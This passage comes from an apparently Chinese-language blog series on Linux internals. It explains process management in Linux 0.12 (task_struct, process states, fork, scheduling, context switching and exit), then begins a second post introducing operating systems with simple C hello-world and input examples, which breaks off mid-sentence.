所有的现代操作系统都能够同时运行很多个进程，实际上系统中也仅有一个处理器，那么在一个时间点实际上只有一个进程真正运行在处理器上。但是我们用户在计算机上感觉到真的是同时有很多进程都在运行，并且感觉不到他们之间有什么切换和停滞。 造成这样的现象，实际上是因为 Linux 内核与处理器建立了多任务的错觉，同时运行的多任务处理实际上是操作系统在运行时通过快速任务切换和调度使得我们无法感觉到任务执行的前后顺序。 对于早期的 Linux 0.12 版本的内核来说，最多能够接受 64 个进程的同时存在。其中除了内核自己建立的并运行起来的第一个进程之外，其他进程都是由系统调用 fork 创建的进程，被创建的进程称为子进程，创建该进程的进程称为父进程。内核程序使用进程标识号( PID ) 来标记识别每一个进程。进程由可执行的指令代码、数据以及堆栈区组成。进程中的代码和数据部分分别存放在对应执行文件的代码段、数据段。每个进程只能执行自己的代码和访问自己的数据和堆栈区域。进程之间的通信需要通过系统调用来进行。对于一个 CPU 的系统，同一时刻也仅有一个进程正在运行。Linux 内核通过调度程序分时处理各个进程运行。 0x06 Linux 中进程表介绍在 Linux 操作系统中，Linux 内核实际上通过进程表来对系统中的进程进行管理，每个进程在进程表中都占有一项。在 Linux 系统中，进程表实际上就是一个 task_struct 数据结构的指针。这个数结构十分重要。 Linux 内核中设计到进程和程序的所有管理和算法都围绕着一个名为 task_struct 的数据结构建立，该数据结构的定义位于 Linux 内核代码中 include/Linux/sched.h 头文件中。在具体讲解 Linux 对于进程管理之前必须先了解一下这个重要的数据结构。 task_struct 中包含了很多数据成员，具体代码定义内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* 任务(进程)数据结构，或称为进程描述符 */struct task_struct &#123;/* these are hardcoded - don&#x27;t touch *//* 硬编码字段 */ long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ /* 任务运行状态 -1 不可运行，0 可运行(就绪)， &gt;0 已停止 */ long counter; /* 任务运行时间计数(递减)(滴答数)，运行时间片 */ long priority; /* 优先级 */ long signal; /* 信号位图 */ struct sigaction sigaction[32]; /* 信号执行属性结构,对应信号将要执行的操作和标志信息 */ long blocked; /* 进程信号屏蔽码(对应信号位图) */ /* bitmap of masked signals *//* various fields *//* 可变字段 */ int exit_code; /* 退出码 */ unsigned long start_code; /* 代码段地址 */ unsigned long end_code; /* 代码段长度（字节数） */ unsigned long end_data; /* 代码段加数据段的长度 （字节数）*/ unsigned long brk; /* 总长度(字节数) */ unsigned long start_stack; /* 堆栈段地址 */ long pid; /* 进程标识号(进程号) */ long pgrp; /* 进程组号 */ long session; /* 会话号 */ long leader; /* 会话首领 */ int groups[NGROUPS]; /* 进程所属组号（一个进程可属于多个组） */ /* * pointers to parent process, youngest child, younger sibling, * older sibling, respectively. (p-&gt;father can be replaced with * p-&gt;p_pptr-&gt;pid) */ struct task_struct *p_pptr; /* 指向父进程的指针 */ struct task_struct *p_cptr; /* 指向最新子进程的指针 */ struct task_struct *p_ysptr; /* 指向比自己后创建的相邻进程的指针 */ struct task_struct *p_osptr; /* 指向比自己早创建的相邻进程的指针 */ unsigned short uid; /* 用户id */ unsigned short euid; /* 有效用户id */ unsigned short suid; /* 保存的设置用户id */ unsigned short gid; /* 组id */ unsigned short egid; /* 有效组id */ unsigned short sgid; /* 保存的设置组id */ unsigned long timeout; /* 内核定时超时值 */ unsigned long alarm; /* 报警定时值(滴答数) */ long utime; /* 用户态运行时间(滴答数) */ long stime; /* 内核态运行时间(滴答数) */ long cutime; /* 子进程用户态运行时间 */ long cstime; /* 子进程内核态运行时间 */ long start_time; /* 进程开始运行时刻 */ struct rlimit rlim[RLIM_NLIMITS]; /* 进程资源使用统计数组 */ unsigned int flags; /* per process flags, defined below */ /* 各进程的标志 */ unsigned short used_math; /* 是否使用了协处理器的标志 *//* file system info */ int tty; /* -1 if no tty, so it must be signed */ /* 进程使用tty终端的子设备号。-1表示没有使用 */ unsigned short umask; /* 文件创建属性屏蔽位 */ struct m_inode * pwd; /* 当前工作目录i节点结构指针 */ struct m_inode * root; /* 根目录i节点结构指针 */ struct m_inode * executable; /* 执行文件i节点结构指针 */ struct m_inode * library; /* 被加载库文件i节点结构指针 */ unsigned long close_on_exec; /* 执行时关闭文件句柄位图标志 */ struct file * filp[NR_OPEN]; /* 文件结构指针表，最多32项。表项号即是文件描述符的值 *//* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */ struct desc_struct ldt[3]; /* 局部描述符表, 0 - 空，1 - 代码段cs，2 - 数据和堆栈段ds&amp;ss *//* tss for this task */ struct tss_struct tss; /* 进程的任务状态段信息结构 */&#125;; 对于数据量这么庞大、如此复杂的数据结构，短时间内弄清楚是很困难的，我们可以将这个结构中的内容分为几个部分来逐个理解弄清楚。虽然数据结构内数据量巨大，但是主要可以分为以下几部分进行理解： 表示进程状态和执行信息，待决信号、使用的二进制格式、进程 ID （PID）、父进程及其他相关进程的指针、优先级以及程序执行 有关已经分配的虚拟内存的信息。 进程身份或者权限，用户 ID 、组 ID 等等。 使用的文件包含程序代码的二进制文件、以及进程所处理的所有文件的文件系统信息。 线程信息记录该进程特定于 CPU 的运行时间数据。 在于其他应用程序协作时所需的进程间通信有关的信息。 该进程所用到的信号处理程序，用于响应到来的信号。 下面，先将其中重要的几个成员变量进行讲解说明。 statetask_struct 结构中的 state 成员变量表示的就是该进程当前的状态，在 Linux 内核中，进程主要分为以下几种状态： TASK_RUNNING ：表示进程处于可运行状态。但是可运行状态并不意味着实际分配了 CPU 资源。这样的状态其实对应的就是进程的就绪状态，意味着当系统调度器选中该进程时能够立刻执行它。 TASK_INTERRUPTIBLE ：该状态是针对等待某个事件或其他资源的睡眠进程设置的。处于这种状态下的进程在得到内核对于信号后会立刻将状态改变成 TASK_RUNNING 状态以恢复正常运行。 TASK_UNINTERRUPTIBLE ：这种状态表示是接收到内核指示而停用的睡眠进程。这样的进程不能够由外部信号唤醒，只能由内核亲自唤醒。 TASK_STOPPED ：该状态表示进程特意停止运行，例如：由调度器指示而暂停的进程。 TASK_TRACED ：这种状态实际上并不是有进程本身运行过程中出现的，是当进程处于被调试的时候用来与常规进程区分而设计的进程状态。 counter 字段counter 主要用来保存进程在暂时停止本次运行之前还能够执行的时间滴答数，即在正常情况下还需要经过多少个系统时钟周期才会切换到另一个进程。调度程序会使用进程的该成员值来选择下一个要执行的进程。因此， counter 可以看做是一个进程的动态特性。在一个进程刚被创建时，counter 的初始值为 priority。 priority结合前面对 counter 的描述，priority 的作用就是为了给 counter 赋值。在 Linux 0.12 版本中这个初值设定为 15 ，表示设定初始值为 15 个时间滴答数。 signalsignal 字段表示进程当前接收到信号的位图，总共 32 位，每一位代表一种系统信号类型。因此，Linux 内核中最多也仅有 32 种信号。在每个系统调用处理后，系统会使用该信号位图对信号进行预处理。 sigaction 数组该数值类型为 struct sigaction ，该结构数组用来保存处理各个信号所用的操作和属性，数组每一项对应一个信号。具体结构体定义如下： 123456struct sigaction &#123; void (*sa_handler)(int); /* 对应某信号指定要采取的行动 */ sigset_t sa_mask; /* 对信号的屏蔽码，在信号程序执行时将阻塞对这些信号的处理 */ int sa_flags; /* 改变信号处理过程的信号集 */ void (*sa_restorer)(void);/* 恢复函数指针，由函数库Libc提供，用于清理用户态堆栈 */&#125;; blocked该字段表示进程当前不想要处理的信号的阻塞位图。与 signal 字段类似，每一位表示一种对应被阻塞的信号。 exit这一字段用来保存程序终止时的退出码。在子进程结束后父进程能够查询子进程的这个退出码。 start_code该字段用来保存进程代码在 CPU 线性地址空间中的开始地址，在 Linux 0.12 内核中这个数值是 64 MB 的整数倍。 end_code该字段保存着进程代码的字节长度值。 end_data该字段保存进程的代码程度 + 数据长度的总字节长度值。 brk这个字段也是进程代码和数据的总字节长度（指针值），但是还包括未初始化的数据区 BSS 。这是 brk 在一个进程开始执行的初始值。通过修改这个指针的数值，内核可以为进程添加和释放动态分配的内存（通常通过调用 malloc 函数来调用 brk 系统调用实现）。 start_stack该字段指向进程逻辑地址空间中堆栈的起始处。 pid顾名思义，保存进程标识号，用来唯一表示进程。 pgrp指进程所属进程组号 session进程的会话号，所属会话的进程号 leader进程所属会话的首进程号。 group[NGROUPS]进程所属各个组的组号数组，一个进程可以属于多个组 p_pptr 、 p_cptr 、 p_ysptr 、 p_isptr这几个字段均为 task_struct 数据结构指针。其中： p_pptr 是指向父进程任务结构的指针 p_cptr 是指向最新子进程任务结构的指针 p_ysptr 是指向比自己后创建的相邻进程的指针 p_isptr 是指向比自己早创建的相邻进程的指针 以上这四个指针的关系如下图所示，通过这样的成员指针数据，内核很容易就能通过一个进程的任务结构获取到其他与这个进程有关系的进程的任务结构对象。 uid 、 euid 、 suid 、 gid 、 egid 、 sgid这几个成员字段都属于进程用户相关标识号，其中： uid：保存拥有这个进程的用户标识号（用户 ID ） euid：有效用户标识号，表示访问文件的权限 suid ：文件保存的用户标识号，当执行文件的设置用户 ID 标志置一时， suid 中把保存执行文件的 uid ，否则保存进程的 euid gid ：指用户所属的组标识号（组 ID ），指明了用于该进程的用户组 egid ：有效组 ID ，用于指明该组用户访问文件的权限 sgid ：保存的用户 ID ，当执行文件的设置组 ID 标志置一时，sgid 中保存执行文件的 gid ；否则，保存进程的 egid 。 timeout记录内核定时超时的值。 alarm用于进程的报警定时值。如果进程使用系统调用 alarm() 设置过该字段，则内核会把该函数以秒为单位的参数转换成滴答值存放到这个字段中， rlim 数组rlim 数组成员主要作为 Linux 提供资源限制的参数，该数组成员类型为 struct rlimit ，具体如下： 1234struct rlimit &#123; int rlim_cur; int rlim_max;&#125;; 具体类型中： rlim_cur ：表示进程当前的资源限制，也称为软件限制。 rlim_max ：表示进程当前最大可允许的限制范围，称为硬件限制。 操作系统能够调用 setrlimit() 函数来增减当前的资源限制具体数值，但是依旧不能够超过 rlim_max 指定的值。对应的，getrlimits() 能够用来检查当前限制的具体数值。 在内核中，对于 rlim 变量的数组位置是与资源类型相关的，这是 Linux 内核中预定义的常数，在 Linux 0.12 版本中还仅有 6 中资源类型，后面发展到现在已经多达 15 种类型了，具体可以使用 man 手册查看 setrlimit 。这里简单列出 Linux 0.12 版本中定义的几种类型，其定义位置位于内核源代码的 include/sys/resource.h 头文件中，具体如下： 12345678910111213141516#define RLIMIT_CPU 0 /* CPU time in ms */#define RLIMIT_FSIZE 1 /* Maximum filesize */#define RLIMIT_DATA 2 /* max data size */#define RLIMIT_STACK 3 /* max stack size */#define RLIMIT_CORE 4 /* max core file size */#define RLIMIT_RSS 5 /* max resident set size */#ifdef notdef#define RLIMIT_MEMLOCK 6 /* max locked-in-memory address space*/#define RLIMIT_NPROC 7 /* max number of processes */#define RLIMIT_OFILE 8 /* max number of open files */#endif#define RLIM_NLIMITS 6#define RLIM_INFINITY 0x7fffffff 实际上，在 Linux 操作系统下，我们还能够通过 cat 命令来查看当前系统中设置的各个资源限制数值。打开终端窗口，输入如下命令： 1cat /proc/self/limits 显示结果如下： 其他字段这个结构体中其他字段也都是用来描述进程在执行过冲中的一些状态会用到的值，具体的内容等到我们用到的时候再来描述，这里就不再一一叙述了。 0x07 进程运行状态一个进程在生存期内，可以处于不同的状态并且相互转换，这样的状态称为进程状态。进程的当前状态保存在刚刚我们描述过的字段 state 中。当进程正在等待系统中的资源而处于等待状态时，称为睡眠等待状态。在 Linux 系统中，睡眠等待状态分为可中断和不可中断的等待状态。进程具体状态转换关系如下图所示： 其中，需要重点描述几个不同的进程运行状态： 运行状态 TASK_RUNNING 当进程正在被 CPU 执行，或已经准备就绪随时可以由调度程序执行，则该进程的当前状态就是出于运行状态。如果此时进程没有被 CPU 执行，则进程当前状态为就绪运行状态。另外，进程可以在用户态运行也可以在内核态运行。当进程正在执行用户自己的代码时，可以看做处于用户态运行；而当进程在内核代码中运行时则看做出于内核态运行。像上图描述的那样，当进程因为等待系统资源而进入睡眠状态后，系统资源准备就绪后就会唤醒进程从而使进程状态转换成就绪态。 可中断睡眠状态 TASK_INTERRUPTIBLE 当进程处于可中断等待（睡眠）状态时，系统不会调度该进程执行。当系统产生一个中断或者释放了进程正在等待的资源，或者进程收到一个信号，都可以唤醒进程转换到就绪状态。 不可中断睡眠状态 TASK_UNINTERRUPTIBLE 这个状态与可中断睡眠状态最大的不同就是不会因为收到信号而被唤醒，除此之外，其他状态均与可中断睡眠状态类似。处于该状态的进程只能被使用 wake_up() 函数明确唤醒才能转换成可运行的就绪状态。该状态通常在进程需要不受干扰地等待或者所等待事件会快就会发生的时候使用。 暂停状态 TASK_STOPPED 当进程收到信号 SIGSTOP 、 SIGTSTP 、 SIGTTIN 、 SIGTTOU 时就会进入暂停状态。这时候可以通过将信号 SIGONT 发送给进程使得其将状态转换成可运行状态。进程在调试期间接收到任何信号都能进入该状态。 僵死状态 TASK_ZOMBIE 当进程已经停止运行，但是这个进程的父进程还没有调用系统函数去询问其状态时，该进程会处于僵死状态。为了让父进程能够给获取其运行的信息，此时子进程的任务数据结构信息需要持续保留着，以供父进程随时调用，当父进程调用函数查看了该进程的运行信息后，该进程的任务数据结构就会被释放。 当一个进程的运行时间片用完，系统就会使用调度程序强制切换到其他进程去执行。另外，如果进程在内核态运行时需要等待系统的某个资源，此时该进程会调用 sleep_on() 或者 interruptible_sleep_on() 主动放弃 CPU 的使用权，而使得调度程序去调度其他进程获取 CPU 资源进行执行，当前进程在调用函数后会转入睡眠状态等待合适的时候再恢复执行。 0x08 进程初始化在 Linux 内核代码中，在 boot/ 目录中，引导程序将内核从磁盘上加载到内存中，并使得系统进入保护模式下运行以后，就开始执行系统初始化程序 init/main.c ，该程序首先确定如何分配使用系统物理内存，如何调用内核各部分的初始化函数分别对内存管理、中断处理、块设备和字符设备、进程管理以及硬盘和软盘硬件进行初始化处理。在完成这些初始化操作后，系统各部分将处于可运行状态，此后程序把自己设定为 0 号进程并运行，之后再使用 fork() 调用首次创建 1 号进程。在 1 号进程中，程序将继续进行应用环境的初始化并执行 shell 登录程序。而 0 号进程则会在系统空闲时被调度执行，此时 0 号进程只执行 pause() 系统调用，其中又回去执行调度函数。 其中，内核移动程序到 0 号进程中去执行这个过程宏 move_to_user_mode (include/asm/system.h) 完成，它将 main.c 程序执行流从内核态移动到了用户态的进程 0 中继续运行。在移动之前，系统在对调度程序的初始化过程（sched_init()）中，首先对进程 0 的运行环境进行设置，其中包括人工预先设置好的进程 0 的数据结构各字段的值（include/linux/sched.h）、在全局描述符表中添入进程 0 的任务状态段（TSS）描述符和局部描述符表（LDT）的段描述符，并把它们分别加载到任务寄存器 tr 和局部描述符表寄存器 ldr 中。 内核初始化是一个特殊的过程，内核初始化代码其实就是进程 0 的代码。从进程 0 数据结构中设置的初始数据可以知道，进程 0 的代码段和数据段的基地址都是 0 ，段最大字节长度限制在 640KB 。与之相比较，内核代码的代码段和数据段的基地址也都是 0 ，而段长度限制为 16MB ，因此进程 0 的代码段和数据段是包含在内核代码段和数据段中。内核初始程序 main.c 就是进程 0 的代码，只是在真正成为进程 0 之前，系统正在以内核态特权级 0 运行着 main.c 程序。 宏 move_to_user_mode 的功能就是把运行特权级从内核态的 0 级变换成用户态的 3 级，但是仍然继续执行原来的代码指令流。在变换当前程序到 0 号进程的过程中，宏 move_to_user_mode 使用了中断返回指令造成特权级改变的方法。使用这种方法进行控制权转移是由 CPU 保护机制造成的。 CPU 允许低级别代码通过调用门或中断、陷阱门来调用或转移到高级别代码中运行，但反之则不行。因此内核采用这种模拟 IRET 返回低级别代码的方式。该方法的主要思想是在堆栈中构筑中断返回指令需要的内容，把返回地址的段选择符设置成任务 0 代码段选择符，之后执行中断返回指令 iret 将导致 CPU 从特权级 0 跳转到外层的特权级 3 上运行。具体如下图所示： 宏 move_to_user_mode 首先往内核堆栈中压入进程 0 堆栈端（即数据段）选择符和内核堆栈指针，然后压入标志寄存器内容，最后压入进程 0 代码段选择符和执行中断返回后需要执行的下一条指令的偏移地址。该偏移位置是 iret 后的下一条指令。 当执行 iret 指令时， CPU 把返回地址送入 CS:EIP 中，同时弹出堆栈中标志寄存器内容。由于 CPU 判断出目的代码段的特权级为 3 ，与当前内核态的 0 级不同，于是 CPU 会把堆栈中的堆栈段选择符和堆栈指针弹出到 SS:ESP 中。由于特权级发生了变化，段寄存器 DS 、 ES 、 FS 以及 GS 的值变得无效，此时 CPU 会把这些段寄存器清零，因此在执行了 iret 指令后需要重新加载这些寄存器。这之后，系统就开始以特权级 3 运行在进程 0 的代码上，所使用的用户态堆栈还是原来移动之前使用的堆栈，而内核态的堆栈则被指定为其任务数据结构所在的页面的顶端开始（ PAGE_SIZE + (long)&amp;init_task ）。之后在创建新进程时，需要复制进程 0 的任务数据结构，包括用户堆栈指针，因此要求进程 0 的用户态堆栈在创建进程 1 之前保持“干净”状态。 对于进程的初始化，我们进行理解和掌握即可，这部分的具体操作都是由 Linux 内核自动完成的，当我们真正进入到 Linux 操作系统的用户态下后，进程的初始化已经完成，Linux 操作系统的 0 号进程已经运行起来了。我们自己的程序此时在 Linux 操作系统下运行时会自然而然由 0 号进程进行创建并执行。 0x09 创建新进程Linux 内核中创建新进程使用 fork() 系统调用。所有内核中管理的进程都是通过复制进程 0 而得到的，所以在 Linux 系统下运行的进程最初都是由进程 0 产生的子进程。 在创建新进程的过程中，系统首先在任务数组中找出一个还没有被任何进程使用的空项，如果 Linux 系统下管理的进程已经达到所能管理限制值后（在 Linux 0.12 版本内核中设定的进程数量最大值为 64 ），则 fork() 系统调用会因为任务数组表中没有可用空项而出错返回，然后系统为新建进程在主内存区中申请一页内存来存放其人任务数据结构信息，并且复制当前进程任务数据结构中所有内容作为新进程任务数据结构的模板，为了防止这个还未处理完成的新建进程被调度函数执行，此时应该立刻将新进程状态置位不可中断的等待状态（TASK_UNINTERRUPTIBLE) 复制任务数据结构完成后，接着就是对其进行修改，把当前进程设置为新的进程的父进程，清除信号位图并复位新进程各统计值，并设置初始运行时间片值为 15 个时间滴答数（ 150ms ），接着将根据当前进程设置任务状态段（TSS）中各寄存器的值。由于创建进程时新进程返回值应为 0 ，使用需要设置为 tss.eax = 0 ，新建进程内核态堆栈指针 tss.esp0 被设置成新进程任务数据结构所在内存页面的顶端，而堆栈段 tss.ss0 被设置成内核数据段选择符， tss.ldt 被设置成局部表描述符在 GDT 中的索引值，若当前进程使用了协处理器，则还需要把协处理器的完整状态保存到新进程的 tss.i387 结构中。 之后系统设置新进程的代码段和数据段基地址、限制长度，并复制当前进程内存分页管理的页表。需要注意的是，此时系统并不为新进程分配实际的物理内存页面，而是让它共享父进程的内存页面。只有当父进程或者新进程中任意一个进行了写内存操作时，系统才会为执行写操作的进程分配相关的独立使用的内存页面，这种处理方式称为写时复制技术。 随后，如果父进程中有文件是打开的，则应该将对应文件的打开次数加 1 。紧接着在 GDT 中设置新任务的 TSS 和 LDT 描述符项，其中基地址信息指向新进程任务结构中的 tss 和 ldt ，最后再将新任务设置成可运行状态并返回新进程号。 这里尤其需要注意：创建一个新进程和加载运行一个执行程序文件是两个不同的概念。当创建子进程时，它完全是复制了父进程的代码段和数据区，并会在其中执行子进程部分的代码。而执行存储设备上的程序时，一般会在子进程中运行 exec() 系统调用来进行操作。在进入 exec() 后，子进程原来的代码区和数据区都会被清除掉（释放掉），然后将该进程运行新程序时，由于此时内核还没有从存储设备上将该程序代码加载近来，所以 CPU 会立刻产生代码页面不存在的异常（Fault），此时内存管理程序就会从存储设备上找到对应程序代码加载到内存中，然后 CPU 重新执行引起异常的指令，此时新程序的代码才真正被执行起来。 整体流程如下图所示： 0x0a 进程调度在 Linux 内核中，进程调度主要是为了选择系统中即将要运行的进程，通过调度来回切换进程运行能够给人感觉上多进程同步运行的效果。这种选择运行机制是多任务操作系统的基础，可以将 Linux 内核的调度程序看作在所有处于运行状态的进程之间分配 CPU 运行时间的管理代码。通过前面对 Linux 系统的描述可以知道 Linux 进程是抢占式的，不过被抢占的进程仍然处于 TAK_RUNNING 状态，只不过暂时没有被 CPU 运行。进程的抢占发生在进程处于用户态执行阶段，在内核态执行时是不能够被抢占的。 为了能够使得进程有效地使用系统资源，又能使进程有较快的响应时间，就需要对进程的切换调度采用一定的调度策略。 调度程序Linux 内核中的 schedule() 函数首先扫描进程数组，通过比较每个就绪态（ TASK_RUNNING ）进程的运行时间递减滴答计数 counter 的值来确定当前哪个进程运行的时间最少，counter 的数值越大表示剩余的运行时间越大，于是就选中该进程并使用进程切换宏函数来进行切换到该进程到 CPU 进行运行。 如果此时所有处于 TASK_RUNNING 状态进程的时间片都已经用完，系统就会根据每个进程的优先权值 priority 对系统中所有进程（包括正在睡眠的进程）重新计算每个任务需要运行的时间片值 counter ，Linux 0.12 版本内核中对时间片值的计算公式如下： 1counter = (counter / 2) + priority 通过这样的方式，正在睡眠的进程被唤醒时就会具有较高的时间片值 counter ，然后通过 schedule() 函数重新扫描进程数组中所有处于 TASK_RUNNING 状态的进程，并重复上述过程，直到选择出下一个切换执行的进程，最后调用 switch_to() 宏来执行实际的切换进程操作。 如果此时没有其他进程可以运行，则系统会选择 0 号进程运行，在 Linux 0.12 版本内核中，进程 0 会调用 pause() 将自己设置成可中断的睡眠状态并再次调用 schedule() ，不过在调度进程运行时，schedule() 并不在意进程 0 处于什么状态，只要系统空闲就会调用 0 号进程运行。 具体流程图下图所示： 进程切换每当选择出一个新的可执行的进程时， schedule() 函数就会调用定义在 Linux 内核源代码中的 include/asm/system.h 中的 switch_to() 宏执行实际进程切换操作。该宏会把 CPU 的当前进程状态（上下文）替换成新进程的状态。在进行切换之前，switch_to() 宏会先检查要切换到的进程是否就是当前进程，如果是则调出流程（什么也不做），直接退出；否则，就先将内核全局变量 current 设置成新任务的指针，然后长跳转到新任务的任务状态段 TSS 组成的地址处，造成 CPU 执行任务切换操作。此时，CPU 会把所有寄存器的状态保存到当前任务寄存器 TR 中 TSS 段选择符所指向的当前进程任务数据结构的 tss结构中，然后把新任务状态段选择符所指向的新任务数据结构中 tss 结构中的寄存器信息恢复到 CPU 中，系统就正式开始执行新的进程。这个过程如下图所描述： 0x0b 终止进程当一个进程结束了运行或在半途中止了运行，那么 Linux 内核就需要释放这个进程所占用的系统资源，这包括进程运行时打开的文件、申请的内存等。 当一个用户程序调用 exit() 系统调用时，就会执行内核函数 do_exit() ，这个函数首先会释放进程代码段和数据段占用的内存页面，关闭进程当前打开着的所有文件，对进程使用的当前工种目录、根目录和运行程序的 i 节点进行同步操作。如果进程还存在有子进程，这会让 init 进程作为所有子进程的父进程。如果进程是一个会话头进程并且有控制终端，则释放控制终端，并向属于该会话的所有进程发送挂断信号 SIGHUP ，这通常会终止该会话中的所有进程，然后把进程状态设置为僵死状态 TASK_ZOMBIE ，并向其原父进程发送 SIGCHLD 信号，通知其某个子进程已经终止。最后调用 do_exit() 函数去执行其他进程，由此可见在进程被终止时，它的任务数据结构仍然保留着，因为其父进程还需要使用其中的信息。 在子进程执行期间，父进程通常使用 wait() 或 waitpid() 函数等待其某个子进程终止。当等待的子进程被终止并处于僵死状态时，父进程就会把子进程运行所使用的时间累加到自己的进程中，最终释放已终止子进程任务数据结构所占用的内存页面，并设置空子进程在任务数组中占用的指针项。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】Linux操作系统原理剖析——操作系统概述","date":"2023-12-18T01:37:30.801Z","path":"A_OS/Linux/Linux操作系统原理剖析/1-操作系统概述/","text":"概述：本章知识点 什么是操作系统 操作系统有哪些功能 操作系统的发展历史 操作系统的分类 操作系统的结构组成 Linux 操作系统介绍 0x01 什么是操作系统众所周知，计算机系统是有计算机硬件和计算机软件组成的，而计算机硬件主要是指大家所熟知的中央处理器（CPU）、硬盘、内存、主板、显卡等等，而计算机软件其实是分层次的，在计算机硬件上运行的计算机软件最底层其实就是操作系统。如下图所示，是计算机系统层次结构图： 可以说操作系统就是直接运行在计算机硬件裸机上的第一层软件，是操作系统为上层应用提供了计算机硬件的操作接口和基础功能，并将计算机硬件外设的数据信号等获取到的数据传递给上层应用。 操作系统有哪些功能知道了操作系统在计算机系统中所处的位置后，就应该明白操作系统的主要目的就是为了方便用户使用计算机系统和提高计算机系统资源利用率而诞生的软件系统。 操作系统的主要功能可用概况为以下两方面： 提供人机接口 管理计算机资源 人机接口提供人机接口其实就是运行在计算机硬件上的操作系统为用户的使用提供了方式和方法。最简单的方式就是我们开发人员在计算机上基于操作系统进行软件的开发和使用，从而实现了程序的开发运行。 大家都知道，像 C 、C++ 一类的编译性语言编写的程序在真正运行起来之前是需要进行代码编译、链接后才能运行的。其中，代码编译是将高级语言编译成简单的二进制文件，而引入链接后就需要用到操作系统下的库的概念（尤其是动态库链接），最后到真正运行程序时，程序其实是在操作系统的基础上才运行起来的。 现在，我们大家来简单练习一个最基本的程序员入门程序 “hello world!” 。大家基于现在的 Ubuntu 操作系统环境，在终端窗口下使用 vim 编辑器编写代码，具体命令如下： 1vim hello.c 在打开的 VI 窗口中，使用 i 切换到输入状态，然后编写入如下代码： 1234567#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; printf(&quot;hello world!\\n&quot;); return 0;&#125; 在填写完代码内容后，按下 Esc 切换到正常模式，输入 :wq 保存内容退出 Vi 编辑器，然后通过以下命令完成 C 代码的编译： 1234# 仅进行编译操作，不进行链接gcc -c hello.c -o hello.o# 完成链接操作，产生可执行文件gcc hello.o -o hello 此时，产生的 hello 可执行文件就是基于 Ubuntu（Linux）操作系统的可以运行的程序，如果简单脱离这个操作系统，这个程序是无法运行起来的。我们可以通过 file 命令来查看这个文件的基本属性： 1file hello 结果如下： 通过这样简单的一个程序的编译、运行练习，大家应该明白操作系统所提供的人机接口是什么了吧？其实人机接口主要就是为了给人们提供与计算机进行交互的接口功能。 管理计算机资源计算机系统的资源总的来说分为硬件资源和软件资源，硬件资源有处理器、存储器、外设等；软件资源则大部分指程序和数据。 操作系统提供了大量用于管理这些资源的功能。具体如下： 处理器资源管理：处理器调度、进程控制、进程通信、进程同步 存储管理：内存分配、地址转换、内存保护、内存扩充 设备管理：设备分配、缓冲管理、设备驱动、设备无关性 文件管理：文件存储空间管理、目录管理、文件操作、文件权限控制 下面通过一个简单的输入、输出程序来演示操作系统管理设备的功能，构建实现一个 input 的程序，创建源文件： 1vim input.c 在源文件中添加如下内容： 123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; char msg[128] = &#123;0&#125;; int ret = 0; printf(&quot;Please Input message: \\n&quot;); scanf(&quot;%s&quot;, msg); printf(&quot;Your input message : \\n&quot;); printf(&quot;%s\\n&quot;, msg); return 0;&#125; 添加完成代码后，使用编译器进行编译和运行： 12gcc input.c -o input./input 执行结果如下： 从这个程序的运行过程中能够看出，当程序执行开始，屏幕上会显示我们想要打印的字符串数据，这里就用到了操作系统的输出设备管理功能，将数据发送给显卡进行显示；然后我们通过键盘输入了消息数据，操作系统管理的输入设备（键盘）获取到我们敲击键盘的事件消息后拼成了最终输入的消息数据送给运行的应用程序，然后应用程序最终重新将获取到的数据打印显示到了屏幕上。具体流程参考如下： 0x03 操作系统的分类从一开始的裸机到单任务处理的单片机，最后发展成为如今的多任务并发处理的现代计算机，计算机系统发展迅速，而在计算机系统中十分重要的操作系统也发展形成了多种类不同的操作系统。 由于应对的场景不同，操作系统根据处理多任务的不同方式可以分为： 分时操作系统：目前大部分桌面操作系统都属于分时操作系统，其中最主要的区别就是多任务分时共享计算机的处理资源。目前所见到的 Windows、Ubuntu、MacOS 等桌面操作系统都属于分时操作系统。 实时操作系统：实时操作系统针对工业和需要及时处理数据消息而设计的操作系统，有及时性、可靠性等特点。这类型操作系统多指嵌入式操作系统，有 rtos、uCosII 等等。 0x04 操作系统的结构组成操作系统是一个大型的软件系统，是由许多独立功能的程序模块组成的，这些程序模块共同构成了一个完整的操作系统。大部分的操作系统都可以被分为这样两种结构：层次结构和微内核结构。 层次结构 层次结构操作系统的设计思想主要是按照操作系统各个模块的功能和相互之间的依存关系而设计。而操作系统应该分为多少层，各个层应该在什么位置其实都是层次结构操作系统的设计关键点。处于最底层的程序模块往往成为操作系统的内核。这部分程序模块的功能包括系统中断处理程序、各个外设驱动程序、高优先级处理频率高的程序模块（如时钟管理程序、进程调度程序、低级通信模块、内存管理模块等等）。一般情况下，为了整个操作系统的效率，系统内核部分会在计算机系统工作过程中常驻内存中持续运行。 微内核结构 与层次结构相对的就是微内核结构。微内核结构的操作系统其实就是把操作系统中的基本功能模块组织为操作系统的微内核，而其他功能模块尽量做到内核以外，通过调用内核来实现。微内核机构是具有如下优点： 简化内核代码维护工作：微内核代码量少，结构简单易于维护。当需要增加操作系统功能时，通常情况下仅需要在内核以外进行即可； 建构灵活：在微内核上可以开发实现多种类型的操作系统。例如：在微内核结构上提供一组 Unix 服务程序，那么操作系统对于用户来说就是 Unix 系统，而提供一组 Windows 服务程序则就像是 Windows 系统一样。 安全性高：由于大部分的功能模块都是处于内核以外的部分运行实现，其实类似高级用户一样的层次，则相对于操作系统来说更安全，大部分功能模块产生的漏洞不会影响到系统内核部分。 方便移植：由于硬件相关的部分都包含在微内核中，当需要进行系统移植时，只需要修改微内核代码以适应不同的硬件平台即可进行系统移植，而对于操作系统中各个功能模块以及更上层的应用层来说不需要做任何改变。 Linux 